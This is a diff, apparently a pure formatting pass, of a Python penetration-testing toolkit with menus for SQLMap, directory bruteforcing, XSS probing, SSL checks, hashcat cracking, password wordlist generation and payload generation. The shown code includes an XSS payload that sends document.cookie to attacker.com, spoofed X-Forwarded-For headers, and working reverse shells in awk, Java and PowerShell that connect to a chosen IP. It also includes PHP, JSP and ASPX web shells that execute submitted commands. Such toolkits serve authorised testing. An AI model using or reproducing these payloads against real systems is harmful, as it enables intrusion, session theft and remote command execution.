             print_success(f"Full results saved to: {output_path}")
 
             # Save structured data
-            scan_result = ScanResult(
-                target=target,
-                vulnerabilities=vulnerabilities
-            )
+            scan_result = ScanResult(target=target, vulnerabilities=vulnerabilities)
             json_filename = f"sqlmap_{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
             save_result_to_file(scan_result, json_filename)
         else:
-            display_panel("Scan Complete", "No output from SQLMap scan", NordColors.YELLOW)
+            display_panel(
+                "Scan Complete", "No output from SQLMap scan", NordColors.YELLOW
+            )
     except Exception as e:
         print_error(f"SQLMap scan error: {e}")
 
@@ -1433,7 +1579,7 @@ def directory_bruteforce():
         display_panel(
             "Tool Missing",
             "No directory bruteforce tools installed. Please install one of the following:\nbrew install gobuster ffuf dirb",
-            NordColors.RED
+            NordColors.RED,
         )
         return
 
@@ -1442,7 +1588,12 @@ def directory_bruteforce():
         console.print(f"[bold {NordColors.FROST_2}]Available tools:[/]")
         for i, tool in enumerate(available_tools, 1):
             console.print(f"  {i}. {tool}")
-        tool_choice = get_integer_input(f"Select tool (1-{len(available_tools)})", 1, len(available_tools)) - 1
+        tool_choice = (
+            get_integer_input(
+                f"Select tool (1-{len(available_tools)})", 1, len(available_tools)
+            )
+            - 1
+        )
         if tool_choice < 0:
             tool_choice = 0
 
@@ -1456,16 +1607,21 @@ def directory_bruteforce():
         "/usr/share/wordlists/dirb/common.txt",
         "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
         f"{WORDLISTS_DIR}/web_dirs.txt",
-        "custom"
+        "custom",
     ]
 
-    default_wordlist = next((w for w in wordlist_options if os.path.exists(os.path.expanduser(w))), wordlist_options[0])
+    default_wordlist = next(
+        (w for w in wordlist_options if os.path.exists(os.path.expanduser(w))),
+        wordlist_options[0],
+    )
 
     console.print(f"[bold {NordColors.FROST_2}]Wordlist options:[/]")
     for i, wl in enumerate(wordlist_options, 1):
         console.print(f"  {i}. {wl}")
 
-    wordlist_choice = get_integer_input(f"Select wordlist (1-{len(wordlist_options)})", 1, len(wordlist_options))
+    wordlist_choice = get_integer_input(
+        f"Select wordlist (1-{len(wordlist_options)})", 1, len(wordlist_options)
+    )
     if wordlist_choice <= 0:
         return
 
@@ -1476,13 +1632,40 @@ def directory_bruteforce():
 
     if not os.path.exists(os.path.expanduser(wordlist)):
         wordlist_dir = WORDLISTS_DIR / "web_dirs.txt"
-        print_warning(f"Wordlist {wordlist} not found. Creating a basic one at {wordlist_dir}")
+        print_warning(
+            f"Wordlist {wordlist} not found. Creating a basic one at {wordlist_dir}"
+        )
 
         basic_dirs = [
-            "admin", "login", "wp-admin", "wp-content", "images", "img", "css", "js",
-            "upload", "uploads", "backup", "backups", "config", "dashboard", "api",
-            "php", "include", "includes", "src", "test", "tests", "tmp", "temp",
-            "admin", "administrator", "login", "wp-login.php", "cpanel", "phpmyadmin"
+            "admin",
+            "login",
+            "wp-admin",
+            "wp-content",
+            "images",
+            "img",
+            "css",
+            "js",
+            "upload",
+            "uploads",
+            "backup",
+            "backups",
+            "config",
+            "dashboard",
+            "api",
+            "php",
+            "include",
+            "includes",
+            "src",
+            "test",
+            "tests",
+            "tmp",
+            "temp",
+            "admin",
+            "administrator",
+            "login",
+            "wp-login.php",
+            "cpanel",
+            "phpmyadmin",
         ]
 
         with open(wordlist_dir, "w") as f:
@@ -1491,7 +1674,9 @@ def directory_bruteforce():
 
         wordlist = str(wordlist_dir)
 
-    extensions = get_user_input("Enter file extensions to look for (e.g., php,html,txt) or leave blank")
+    extensions = get_user_input(
+        "Enter file extensions to look for (e.g., php,html,txt) or leave blank"
+    )
 
     if selected_tool == "gobuster":
         cmd = ["gobuster", "dir", "-u", target, "-w", wordlist, "-q"]
@@ -1512,8 +1697,12 @@ def directory_bruteforce():
             cmd.extend(["-X", extensions.replace(",", ",")])
 
     try:
-        with console.status(f"[bold {NordColors.FROST_2}]Bruteforcing directories on {target}...[/]"):
-            result = run_command(cmd, capture_output=True, timeout=1800)  # 30 minute timeout
+        with console.status(
+            f"[bold {NordColors.FROST_2}]Bruteforcing directories on {target}...[/]"
+        ):
+            result = run_command(
+                cmd, capture_output=True, timeout=1800
+            )  # 30 minute timeout
 
         if result.stdout:
             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -1527,10 +1716,19 @@ def directory_bruteforce():
 
             for line in result.stdout.splitlines():
                 if selected_tool == "gobuster":
-                    if "Status: 200" in line or "Status: 301" in line or "Status: 302" in line:
+                    if (
+                        "Status: 200" in line
+                        or "Status: 301" in line
+                        or "Status: 302" in line
+                    ):
                         parts = line.split()
                         if len(parts) >= 2:
-                            found_dirs.append({"path": parts[0], "status": parts[1].replace("Status:", "")})
+                            found_dirs.append(
+                                {
+                                    "path": parts[0],
+                                    "status": parts[1].replace("Status:", ""),
+                                }
+                            )
                 elif selected_tool == "ffuf":
                     if "Status:" in line and not line.startswith("["):
                         parts = line.split()
@@ -1544,14 +1742,16 @@ def directory_bruteforce():
                     if "CODE:200" in line or "CODE:301" in line or "CODE:302" in line:
                         parts = line.split()
                         path = next((p for p in parts if target in p), "")
-                        status = line.split("CODE:")[1].split()[0] if "CODE:" in line else ""
+                        status = (
+                            line.split("CODE:")[1].split()[0] if "CODE:" in line else ""
+                        )
                         if path:
                             found_dirs.append({"path": path, "status": status})
 
             display_panel(
                 f"{selected_tool.capitalize()} Scan Results",
                 f"Found {len(found_dirs)} directories/files on {target}",
-                NordColors.GREEN if found_dirs else NordColors.YELLOW
+                NordColors.GREEN if found_dirs else NordColors.YELLOW,
             )
 
             if found_dirs:
@@ -1575,13 +1775,19 @@ def directory_bruteforce():
 
             print_success(f"Full results saved to: {output_path}")
         else:
-            display_panel("Scan Complete", f"No output from {selected_tool} scan", NordColors.YELLOW)
+            display_panel(
+                "Scan Complete",
+                f"No output from {selected_tool} scan",
+                NordColors.YELLOW,
+            )
     except Exception as e:
         print_error(f"Directory bruteforce error: {e}")
 
 
 def xss_check():
-    target = get_user_input("Enter target URL with parameter (e.g., http://example.com/page.php?param=test)")
+    target = get_user_input(
+        "Enter target URL with parameter (e.g., http://example.com/page.php?param=test)"
+    )
     if not target:
         return
 
@@ -1616,12 +1822,14 @@ def xss_check():
         "javascript:alert('XSS')",
         "\"><script>alert('XSS')</script>",
         "';alert('XSS');//",
-        "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>"
+        "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>",
     ]
 
     results = []
 
-    progress, task = display_progress(len(params) * len(xss_payloads), "Testing XSS payloads", NordColors.FROST_2)
+    progress, task = display_progress(
+        len(params) * len(xss_payloads), "Testing XSS payloads", NordColors.FROST_2
+    )
 
     with progress:
         for param_name in params:
@@ -1636,21 +1844,25 @@ def xss_check():
                 try:
                     headers = {
                         "User-Agent": random.choice(USER_AGENTS),
-                        "X-Forwarded-For": f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                        "X-Forwarded-For": f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
                     }
 
                     response = requests.get(test_url, headers=headers, timeout=10)
 
                     # Check if payload is reflected in the response
                     if payload in response.text:
-                        results.append({
-                            "param": param_name,
-                            "payload": payload,
-                            "reflected": True,
-                            "status_code": response.status_code
-                        })
+                        results.append(
+                            {
+                                "param": param_name,
+                                "payload": payload,
+                                "reflected": True,
+                                "status_code": response.status_code,
+                            }
+                        )
                 except Exception as e:
-                    print_error(f"Error testing {param_name} with payload {payload}: {e}")
+                    print_error(
+                        f"Error testing {param_name} with payload {payload}: {e}"
+                    )
                 finally:
                     progress.update(task, advance=1)
 
@@ -1658,7 +1870,7 @@ def xss_check():
         display_panel(
             "XSS Test Results",
             f"Found {len(results)} potential XSS vulnerabilities",
-            NordColors.YELLOW
+            NordColors.YELLOW,
         )
 
         table = Table(
@@ -1674,25 +1886,30 @@ def xss_check():
             table.add_row(
                 result["param"],
                 result["payload"],
-                f"Reflected (Status: {result['status_code']})"
+                f"Reflected (Status: {result['status_code']})",
             )
 
         console.print(table)
         console.print(
-            f"\n[bold {NordColors.RED}]WARNING:[/] This is a basic check only. Manual verification is required.")
+            f"\n[bold {NordColors.RED}]WARNING:[/] This is a basic check only. Manual verification is required."
+        )
 
         if get_confirmation("Save these results to file?"):
             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"xss_check_{parts[0].replace('://', '_').replace('/', '_')}_{timestamp}.json"
             save_result_to_file(
-                {"target": target, "results": results, "timestamp": datetime.datetime.now().isoformat()},
-                filename
+                {
+                    "target": target,
+                    "results": results,
+                    "timestamp": datetime.datetime.now().isoformat(),
+                },
+                filename,
             )
     else:
         display_panel(
             "XSS Test Results",
             "No obvious XSS vulnerabilities found. This doesn't guarantee safety - manual testing is recommended.",
-            NordColors.GREEN
+            NordColors.GREEN,
         )
 
 
@@ -1721,7 +1938,9 @@ def ssl_tls_check():
 
 
 def basic_ssl_check(target, port):
-    console.print(f"[bold {NordColors.FROST_2}]Checking SSL/TLS configuration for {target}:{port}...[/]")
+    console.print(
+        f"[bold {NordColors.FROST_2}]Checking SSL/TLS configuration for {target}:{port}...[/]"
+    )
 
     try:
         # Try to establish a secure connection
@@ -1734,10 +1953,10 @@ def basic_ssl_check(target, port):
                 cert = ssock.getpeercert()
 
                 # Check certificate info
-                not_after = cert.get('notAfter', 'Unknown')
-                not_before = cert.get('notBefore', 'Unknown')
-                issuer = dict(x[0] for x in cert.get('issuer', []))
-                subject = dict(x[0] for x in cert.get('subject', []))
+                not_after = cert.get("notAfter", "Unknown")
+                not_before = cert.get("notBefore", "Unknown")
+                issuer = dict(x[0] for x in cert.get("issuer", []))
+                subject = dict(x[0] for x in cert.get("subject", []))
 
                 # Print certificate details
                 display_panel(
@@ -1749,23 +1968,30 @@ def basic_ssl_check(target, port):
                     f"Valid until: {not_after}\n"
                     f"Protocol: {ssock.version()}\n"
                     f"Cipher: {ssock.cipher()[0]}",
-                    NordColors.GREEN
+                    NordColors.GREEN,
                 )
 
                 # Check if certificate is expired
                 try:
                     from datetime import datetime
                     import time
+
                     expires = ssl.cert_time_to_seconds(not_after)
                     remaining = expires - time.time()
                     days_remaining = remaining / (24 * 60 * 60)
 
                     if days_remaining < 0:
-                        print_error(f"Certificate EXPIRED {abs(int(days_remaining))} days ago")
+                        print_error(
+                            f"Certificate EXPIRED {abs(int(days_remaining))} days ago"
+                        )
                     elif days_remaining < 30:
-                        print_warning(f"Certificate expires in {int(days_remaining)} days")
+                        print_warning(
+                            f"Certificate expires in {int(days_remaining)} days"
+                        )
                     else:
-                        print_success(f"Certificate valid for {int(days_remaining)} days")
+                        print_success(
+                            f"Certificate valid for {int(days_remaining)} days"
+                        )
                 except Exception:
                     print_warning("Could not determine certificate expiration")
 
@@ -1781,9 +2007,9 @@ def basic_ssl_check(target, port):
                             "valid_until": not_after,
                             "protocol": ssock.version(),
                             "cipher": ssock.cipher()[0],
-                            "timestamp": datetime.datetime.now().isoformat()
+                            "timestamp": datetime.datetime.now().isoformat(),
                         },
-                        filename
+                        filename,
                     )
     except ssl.SSLError as e:
         print_error(f"SSL Error: {e}")
@@ -1797,7 +2023,9 @@ def nmap_ssl_check(target, port):
     cmd = ["nmap", "--script", "ssl-enum-ciphers,ssl-cert", "-p", str(port), target]
 
     try:
-        with console.status(f"[bold {NordColors.FROST_2}]Scanning SSL/TLS on {target}:{port}...[/]"):
+        with console.status(
+            f"[bold {NordColors.FROST_2}]Scanning SSL/TLS on {target}:{port}...[/]"
+        ):
             result = run_command(cmd, capture_output=True, timeout=300)
 
         if result.stdout:
@@ -1815,13 +2043,21 @@ def nmap_ssl_check(target, port):
                 elif "Issuer:" in line:
                     certificate_info["issuer"] = line.split("Issuer:")[1].strip()
                 elif "Public Key type:" in line:
-                    certificate_info["key_type"] = line.split("Public Key type:")[1].strip()
+                    certificate_info["key_type"] = line.split("Public Key type:")[
+                        1
+                    ].strip()
                 elif "Public Key bits:" in line:
-                    certificate_info["key_bits"] = line.split("Public Key bits:")[1].strip()
+                    certificate_info["key_bits"] = line.split("Public Key bits:")[
+                        1
+                    ].strip()
                 elif "Not valid before:" in line:
-                    certificate_info["not_before"] = line.split("Not valid before:")[1].strip()
+                    certificate_info["not_before"] = line.split("Not valid before:")[
+                        1
+                    ].strip()
                 elif "Not valid after:" in line:
-                    certificate_info["not_after"] = line.split("Not valid after:")[1].strip()
+                    certificate_info["not_after"] = line.split("Not valid after:")[
+                        1
+                    ].strip()
 
                 # TLS version sections
                 if "TLSv1.0" in line:
@@ -1851,9 +2087,7 @@ def nmap_ssl_check(target, port):
 
             # Display the results
             display_panel(
-                "SSL/TLS Scan Results",
-                f"Target: {target}:{port}",
-                NordColors.FROST_2
+                "SSL/TLS Scan Results", f"Target: {target}:{port}", NordColors.FROST_2
             )
 
             # Certificate info
@@ -1909,9 +2143,9 @@ def nmap_ssl_check(target, port):
                         "certificate": certificate_info,
                         "ciphers": cipher_info,
                         "vulnerabilities": vulnerabilities,
-                        "timestamp": datetime.datetime.now().isoformat()
+                        "timestamp": datetime.datetime.now().isoformat(),
                     },
-                    filename
+                    filename,
                 )
 
                 # Also save raw output
@@ -1920,7 +2154,9 @@ def nmap_ssl_check(target, port):
                     f.write(result.stdout)
                 print_success(f"Raw scan output saved to: {RESULTS_DIR / raw_filename}")
         else:
-            display_panel("Scan Complete", "No SSL/TLS information found", NordColors.YELLOW)
+            display_panel(
+                "Scan Complete", "No SSL/TLS information found", NordColors.YELLOW
+            )
     except Exception as e:
         print_error(f"SSL/TLS scan error: {e}")
 
@@ -1931,7 +2167,7 @@ def password_tools_module():
     display_panel(
         "Password Tools",
         "Password generation, hashing, and cracking tools.",
-        NordColors.FROST_3
+        NordColors.FROST_3,
     )
 
     options = [
@@ -1939,7 +2175,7 @@ def password_tools_module():
         ("2", "Hash Password", "Generate hashes from passwords"),
         ("3", "Crack Hash (Hashcat)", "Attempt to crack password hashes"),
         ("4", "Dictionary Generator", "Create custom wordlists"),
-        ("0", "Return", "Return to Main Menu")
+        ("0", "Return", "Return to Main Menu"),
     ]
 
     console.print(create_menu_table("Password Tools Options", options))
@@ -2004,7 +2240,7 @@ def generate_password():
 
         # Shuffle the password
         random.shuffle(password)
-        passwords.append(''.join(password))
+        passwords.append("".join(password))
 
     console.print()
     table = Table(
@@ -2043,15 +2279,25 @@ def hash_password():
     salt = get_user_input("Enter salt (optional)")
 
     hash_types = [
-        "md5", "sha1", "sha224", "sha256", "sha384", "sha512",
-        "sha3_224", "sha3_256", "sha3_384", "sha3_512"
+        "md5",
+        "sha1",
+        "sha224",
+        "sha256",
+        "sha384",
+        "sha512",
+        "sha3_224",
+        "sha3_256",
+        "sha3_384",
+        "sha3_512",
     ]
 
     console.print(f"[bold {NordColors.FROST_2}]Available hash types:[/]")
     for i, hash_type in enumerate(hash_types, 1):
         console.print(f"  {i}. {hash_type}")
 
-    hash_choice = get_integer_input(f"Select hash type (1-{len(hash_types)})", 1, len(hash_types))
+    hash_choice = get_integer_input(
+        f"Select hash type (1-{len(hash_types)})", 1, len(hash_types)
+    )
     if hash_choice <= 0:
         return
 
@@ -2099,7 +2345,7 @@ def crack_hash():
         display_panel(
             "Tool Missing",
             "Hashcat is not installed. Please install it using:\nbrew install hashcat",
-            NordColors.RED
+            NordColors.RED,
         )
         return
 
@@ -2110,17 +2356,32 @@ def crack_hash():
     # Hash type selection
     hash_types = [
         {"id": 0, "name": "MD5", "example": "5f4dcc3b5aa765d61d8327deb882cf99"},
-        {"id": 100, "name": "SHA1", "example": "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8"},
-        {"id": 1400, "name": "SHA2-256", "example": "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"},
-        {"id": 1700, "name": "SHA2-512",
-         "example": "b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86"}
+        {
+            "id": 100,
+            "name": "SHA1",
+            "example": "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8",
+        },
+        {
+            "id": 1400,
+            "name": "SHA2-256",
+            "example": "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
+        },
+        {
+            "id": 1700,
+            "name": "SHA2-512",
+            "example": "b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86",
+        },
     ]
 
     console.print(f"[bold {NordColors.FROST_2}]Select hash type:[/]")
     for i, hash_type in enumerate(hash_types, 1):
-        console.print(f"  {i}. {hash_type['name']} (example: {hash_type['example'][:20]}...)")
+        console.print(
+            f"  {i}. {hash_type['name']} (example: {hash_type['example'][:20]}...)"
+        )
 
-    hash_choice = get_integer_input(f"Select hash type (1-{len(hash_types)})", 1, len(hash_types))
+    hash_choice = get_integer_input(
+        f"Select hash type (1-{len(hash_types)})", 1, len(hash_types)
+    )
     if hash_choice <= 0:
         return
 
@@ -2128,15 +2389,25 @@ def crack_hash():
 
     # Attack mode selection
     attack_modes = [
-        {"id": 0, "name": "Dictionary Attack", "description": "Try passwords from a wordlist"},
-        {"id": 3, "name": "Brute Force", "description": "Try all possible combinations (limited)"}
+        {
+            "id": 0,
+            "name": "Dictionary Attack",
+            "description": "Try passwords from a wordlist",
+        },
+        {
+            "id": 3,
+            "name": "Brute Force",
+            "description": "Try all possible combinations (limited)",
+        },
     ]
 
     console.print(f"[bold {NordColors.FROST_2}]Select attack mode:[/]")
     for i, mode in enumerate(attack_modes, 1):
         console.print(f"  {i}. {mode['name']} - {mode['description']}")
 
-    mode_choice = get_integer_input(f"Select attack mode (1-{len(attack_modes)})", 1, len(attack_modes))
+    mode_choice = get_integer_input(
+        f"Select attack mode (1-{len(attack_modes)})", 1, len(attack_modes)
+    )
     if mode_choice <= 0:
         return
 
@@ -2149,11 +2420,13 @@ def crack_hash():
 
     cmd = [
         "hashcat",
-        "-m", str(selected_hash_type["id"]),
-        "-a", str(selected_mode["id"]),
+        "-m",
+        str(selected_hash_type["id"]),
+        "-a",
+        str(selected_mode["id"]),
         "--status",
         "--force",
-        hash_file
+        hash_file,
     ]
 
     if selected_mode["id"] == 0:  # Dictionary attack
@@ -2162,17 +2435,21 @@ def crack_hash():
             "/usr/share/wordlists/rockyou.txt",
             "/usr/local/share/wordlists/passwords.txt",
             f"{WORDLISTS_DIR}/passwords.txt",
-            "custom"
+            "custom",
         ]
 
-        default_wordlist = next((w for w in wordlist_options if os.path.exists(os.path.expanduser(w))),
-                                wordlist_options[0])
+        default_wordlist = next(
+            (w for w in wordlist_options if os.path.exists(os.path.expanduser(w))),
+            wordlist_options[0],
+        )
 
         console.print(f"[bold {NordColors.FROST_2}]Wordlist options:[/]")
         for i, wl in enumerate(wordlist_options, 1):
             console.print(f"  {i}. {wl}")
 
-        wordlist_choice = get_integer_input(f"Select wordlist (1-{len(wordlist_options)})", 1, len(wordlist_options))
+        wordlist_choice = get_integer_input(
+            f"Select wordlist (1-{len(wordlist_options)})", 1, len(wordlist_options)
+        )
         if wordlist_choice <= 0:
             return
 
@@ -2183,12 +2460,28 @@ def crack_hash():
 
         if not os.path.exists(os.path.expanduser(wordlist)):
             wordlist_dir = WORDLISTS_DIR / "passwords.txt"
-            print_warning(f"Wordlist {wordlist} not found. Creating a basic one at {wordlist_dir}")
+            print_warning(
+                f"Wordlist {wordlist} not found. Creating a basic one at {wordlist_dir}"
+            )
 
             basic_passwords = [
-                "password", "123456", "12345678", "qwerty", "admin", "welcome",
-                "password123", "123456789", "1234567890", "abc123", "letmein",
-                "monkey", "admin123", "iloveyou", "1234", "1qaz2wsx", "dragon"
+                "password",
+                "123456",
+                "12345678",
+                "qwerty",
+                "admin",
+                "welcome",
+                "password123",
+                "123456789",
+                "1234567890",
+                "abc123",
+                "letmein",
+                "monkey",
+                "admin123",
+                "iloveyou",
+                "1234",
+                "1qaz2wsx",
+                "dragon",
             ]
 
             with open(wordlist_dir, "w") as f:
@@ -2199,7 +2492,9 @@ def crack_hash():
 
         cmd.append(wordlist)
     else:  # Brute force
-        charset = get_user_input("Enter character set (e.g., ?a for all, ?l for lowercase, ?d for digits)")
+        charset = get_user_input(
+            "Enter character set (e.g., ?a for all, ?l for lowercase, ?d for digits)"
+        )
         if not charset:
             charset = "?a"
 
@@ -2213,10 +2508,14 @@ def crack_hash():
         cmd.append(mask)
 
         if min_len != max_len:
-            print_warning(f"Hashcat will try lengths from {min_len} to {max_len} in separate runs")
+            print_warning(
+                f"Hashcat will try lengths from {min_len} to {max_len} in separate runs"
+            )
 
     try:
-        with console.status(f"[bold {NordColors.FROST_2}]Running hashcat to crack hash...[/]"):
+        with console.status(
+            f"[bold {NordColors.FROST_2}]Running hashcat to crack hash...[/]"
+        ):
             result = run_command(cmd, capture_output=True, timeout=300, check=False)
 
         # Check if cracked
@@ -2236,13 +2535,13 @@ def crack_hash():
             display_panel(
                 "Hash Cracking Success",
                 f"Hash: {hash_input}\nPassword: {password}",
-                NordColors.GREEN
+                NordColors.GREEN,
             )
         else:
             display_panel(
                 "Hash Cracking Failed",
                 "Could not crack the hash with the given parameters. Try a different wordlist or attack mode.",
-                NordColors.RED
+                NordColors.RED,
             )
 
         if get_confirmation("Save crack attempt results to file?"):
@@ -2285,14 +2584,39 @@ def dictionary_generator():
 
     if option == 1:
         words = [
-            "password", "123456", "12345678", "qwerty", "admin", "welcome",
-            "password123", "123456789", "1234567890", "abc123", "letmein",
-            "monkey", "admin123", "iloveyou", "1234", "1qaz2wsx", "dragon",
-            "sunshine", "princess", "football", "baseball", "welcome1",
-            "master", "superman", "batman", "trustno1", "shadow", "cheese"
+            "password",
+            "123456",
+            "12345678",
+            "qwerty",
+            "admin",
+            "welcome",
+            "password123",
+            "123456789",
+            "1234567890",
+            "abc123",
+            "letmein",
+            "monkey",
+            "admin123",
+            "iloveyou",
+            "1234",
+            "1qaz2wsx",
+            "dragon",
+            "sunshine",
+            "princess",
+            "football",
+            "baseball",
+            "welcome1",
+            "master",
+            "superman",
+            "batman",
+            "trustno1",
+            "shadow",
+            "cheese",
         ]
     elif option == 2:
-        names = get_user_input("Enter names separated by commas (e.g., john,mike,susan)")
+        names = get_user_input(
+            "Enter names separated by commas (e.g., john,mike,susan)"
+        )
         if names:
             base_names = [name.strip() for name in names.split(",")]
 
@@ -2300,36 +2624,50 @@ def dictionary_generator():
                 name_lower = name.lower()
                 name_capital = name.capitalize()
 
-                words.extend([
-                    name_lower, name_capital,
-                    f"{name_lower}123", f"{name_capital}123",
-                    f"{name_lower}2023", f"{name_capital}2023",
-                    f"{name_lower}2024", f"{name_capital}2024"
-                ])
+                words.extend(
+                    [
+                        name_lower,
+                        name_capital,
+                        f"{name_lower}123",
+                        f"{name_capital}123",
+                        f"{name_lower}2023",
+                        f"{name_capital}2023",
+                        f"{name_lower}2024",
+                        f"{name_capital}2024",
+                    ]
+                )
     elif option == 3:
         current_year = datetime.datetime.now().year
         for year in range(current_year - 10, current_year + 2):
-            words.extend([
-                f"{year}",
-                f"password{year}",
-                f"admin{year}",
-                f"{year}admin",
-                f"{year}password"
-            ])
+            words.extend(
+                [
+                    f"{year}",
+                    f"password{year}",
+                    f"admin{year}",
+                    f"{year}admin",
+                    f"{year}password",
+                ]
+            )
 
             # Add common date formats
             for month in range(1, 13):
                 for day in range(1, 31):
-                    if (month == 2 and day > 29) or ((month in [4, 6, 9, 11]) and day > 30):
+                    if (month == 2 and day > 29) or (
+                        (month in [4, 6, 9, 11]) and day > 30
+                    ):
                         continue
-                    words.extend([
-                        f"{month:02d}{day:02d}{year}",
-                        f"{day:02d}{month:02d}{year}",
-                        f"{month:02d}{day:02d}{str(year)[2:]}",
-                        f"{day:02d}{month:02d}{str(year)[2:]}"
-                    ])
+                    words.extend(
+                        [
+                            f"{month:02d}{day:02d}{year}",
+                            f"{day:02d}{month:02d}{year}",
+                            f"{month:02d}{day:02d}{str(year)[2:]}",
+                            f"{day:02d}{month:02d}{str(year)[2:]}",
+                        ]
+                    )
     elif option == 4:
-        base_words = get_user_input("Enter base words separated by commas (e.g., company,project,server)")
+        base_words = get_user_input(
+            "Enter base words separated by commas (e.g., company,project,server)"
+        )
         if not base_words:
             print_error("No base words provided")
             return
@@ -2340,15 +2678,24 @@ def dictionary_generator():
             words.append(word)
 
             # Common mutations
-            words.extend([
-                word.lower(), word.upper(), word.capitalize(),
-                f"{word}123", f"{word}2023", f"{word}2024",
-                f"{word}!", f"{word}!!", f"{word}1", f"{word}12"
-            ])
+            words.extend(
+                [
+                    word.lower(),
+                    word.upper(),
+                    word.capitalize(),
+                    f"{word}123",
+                    f"{word}2023",
+                    f"{word}2024",
+                    f"{word}!",
+                    f"{word}!!",
+                    f"{word}1",
+                    f"{word}12",
+                ]
+            )
 
             # Leet speak
-            leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
-            leet_word = ''.join(leet_map.get(c, c) for c in word.lower())
+            leet_map = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7"}
+            leet_word = "".join(leet_map.get(c, c) for c in word.lower())
             if leet_word != word.lower():
                 words.append(leet_word)
                 words.append(f"{leet_word}123")
@@ -2387,7 +2734,7 @@ def payload_generation_module():
     display_panel(
         "Payload Generation",
         "Generate various security testing payloads.",
-        NordColors.RED
+        NordColors.RED,
     )
 
     options = [
@@ -2396,7 +2743,7 @@ def payload_generation_module():
         ("3", "Bind Shell", "Generate bind shell payloads"),
         ("4", "Command Injection", "Generate command injection payloads"),
         ("5", "XSS Payloads", "Generate cross-site scripting payloads"),
-        ("0", "Return", "Return to Main Menu")
+        ("0", "Return", "Return to Main Menu"),
     ]
 
     console.print(create_menu_table("Payload Options", options))
@@ -2428,15 +2775,25 @@ def generate_reverse_shell():
         return
 
     platforms = [
-        "bash", "python", "perl", "php", "ruby", "netcat",
-        "powershell", "java", "golang", "awk"
+        "bash",
+        "python",
+        "perl",
+        "php",
+        "ruby",
+        "netcat",
+        "powershell",
+        "java",
+        "golang",
+        "awk",
     ]
 
     console.print(f"[bold {NordColors.FROST_2}]Available platforms:[/]")
     for i, platform in enumerate(platforms, 1):
         console.print(f"  {i}. {platform}")
 
-    platform_choice = get_integer_input(f"Select platform (1-{len(platforms)})", 1, len(platforms))
+    platform_choice = get_integer_input(
+        f"Select platform (1-{len(platforms)})", 1, len(platforms)
+    )
     if platform_choice <= 0:
         return
 
@@ -2503,7 +2860,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
 $client.Close();'''
         file_extension = "ps1"
     elif selected_platform == "java":
-        payload = f'''
+        payload = f"""
 public class Reverse {{
     public static void main(String[] args) {{
         try {{
@@ -2512,7 +2869,7 @@ public class Reverse {{
             p.waitFor();
         }} catch (Exception e) {{}}
     }}
-}}'''
+}}"""
         file_extension = "java"
     elif selected_platform == "golang":
         payload = f'''package main
@@ -2532,14 +2889,14 @@ func main() {{
 }}'''
         file_extension = "go"
     elif selected_platform == "awk":
-        payload = f'''#!/usr/bin/awk -f
+        payload = f"""#!/usr/bin/awk -f
 BEGIN {{
     s = "/inet/tcp/0/{ip}/{port}";
     while(42) {{
         do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit")
         close(s);
     }}
-}}'''
+}}"""
         file_extension = "awk"
 
     # Display payload
@@ -2547,7 +2904,7 @@ BEGIN {{
     display_panel(
         f"Reverse Shell Payload ({selected_platform})",
         f"Connecting to: {ip}:{port}",
-        NordColors.RED
+        NordColors.RED,
     )
 
     language = selected_platform
@@ -2571,7 +2928,7 @@ BEGIN {{
             name=filename,
             payload_type="reverse_shell",
             target_platform=selected_platform,
-            content=payload
+            content=payload,
         )
         save_result_to_file(payload_obj, f"{filename}.json")
 
@@ -2583,7 +2940,9 @@ def generate_web_shell():
     for i, platform in enumerate(platforms, 1):
         console.print(f"  {i}. {platform}")
 
-    platform_choice = get_integer_input(f"Select platform (1-{len(platforms)})", 1, len(platforms))
+    platform_choice = get_integer_input(
+        f"Select platform (1-{len(platforms)})", 1, len(platforms)
+    )
     if platform_choice <= 0:
         return
 
@@ -2594,7 +2953,7 @@ def generate_web_shell():
     filename = f"web_shell_{selected_platform}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
 
     if selected_platform == "php":
-        payload = '''<?php
+        payload = """<?php
 if(isset($_REQUEST['cmd'])){
     echo "<pre>";
     $cmd = ($_REQUEST['cmd']);
@@ -2605,9 +2964,9 @@ if(isset($_REQUEST['cmd'])){
 <form method="post">
 <input type="text" name="cmd" style="width:500px;height:30px;">
 <button type="submit">Execute</button>
-</form>'''
+</form>"""
     elif selected_platform == "jsp":
-        payload = '''<%@ page import="java.util.*,java.io.*"%>
+        payload = """<%@ page import="java.util.*,java.io.*"%>
 <%
 if (request.getParameter("cmd") != null) {
     out.println("<pre>");
@@ -2626,9 +2985,9 @@ if (request.getParameter("cmd") != null) {
 <form method="post">
 <input type="text" name="cmd" style="width:500px;height:30px;">
 <button type="submit">Execute</button>
-</form>'''
+</form>"""
     elif selected_platform == "aspx":
-        payload = '''<%@ Page Language="C#" %>
+        payload = """<%@ Page Language="C#" %>
 <%@ Import Namespace="System.Diagnostics" %>
 <%@ Import Namespace="System.IO" %>
 <script runat="server">
@@ -2653,9 +3012,9 @@ if (request.getParameter("cmd") != null) {
         <asp:Button ID="Button1" runat="server" Text="Execute" OnClick="Button1_Click" />
     </form>
 </body>
-</html>'''
+</html>"""
     elif selected_platform == "perl":
-        payload = '''#!/usr/bin/perl
+        payload = """#!/usr/bin/perl
